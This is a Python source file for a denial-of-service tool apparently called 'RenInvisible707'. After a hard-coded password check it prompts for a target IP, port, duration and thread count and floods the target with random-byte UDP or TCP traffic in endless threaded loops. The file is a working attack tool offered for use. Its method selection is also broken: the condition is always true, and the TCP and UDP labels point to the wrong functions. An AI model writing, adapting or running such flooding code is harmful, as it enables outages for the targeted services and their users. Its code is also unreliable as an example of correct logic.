import os, sys, time, random, math, genericpath, socket, requests, threading, codecs
from colorama import Fore, Style

version = "2.41\n"
power = random.randint(1, 100)
Developer = "Agung"
edition = "RenInvisible"
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
banner = """
             ┌─────────────────────────────────────────────┐
             │             RyoRV DDoS Network's            │
             ├─────────────────────────────────────────────┤
             │ Methods:                                    │
             │ • TCP -> L4                                 │
             │ • UDP -> L4                                 │
             │ • SOON -> ???                               │
             │ • SOON -> ???                               │
             │ • SOON -> ???                               │
             ├─────────────────────────────────────────────┤
             │ <\> Creator Tools : @RyoRV/IndentityRV      │
             │ <\> Credit Source: Agung                    │
             └─────────────────────────────────────────────┘
"""

os.system("title RenInvisible707")
os.system("cls")
nickname = input("[>] Enter Username: ")
password = input(f"[!] Hey {nickname}!, What is the password: ")

if password == "RvDdosv4":
    print()
else:
    exit()

os.system("cls")
os.system(f"title RenInvisible707 - [Power: {power}%] - [Developer {Developer}] - [Database 2] - [Method 2] - [Edition {edition}] - [IP {local_ip}]")

print(banner)
"\n"
ip = input("IP/URL: ")
port = int(input("TARGET PORT: "))
choice = input("METHODS: ")
times = int(input("TIME: "))
threads = int(input("THREADS: "))

def run():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("<\> RenInvisible707 Community Attack")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(5024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("<\> RenInvisible707 Community Attack")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'TCP' or 'tcp':
		th = threading.Thread(target = run)
		th.start()
	elif choice == 'UDP' or 'udp':
		th = threading.Thread(target = run2)
		th.start()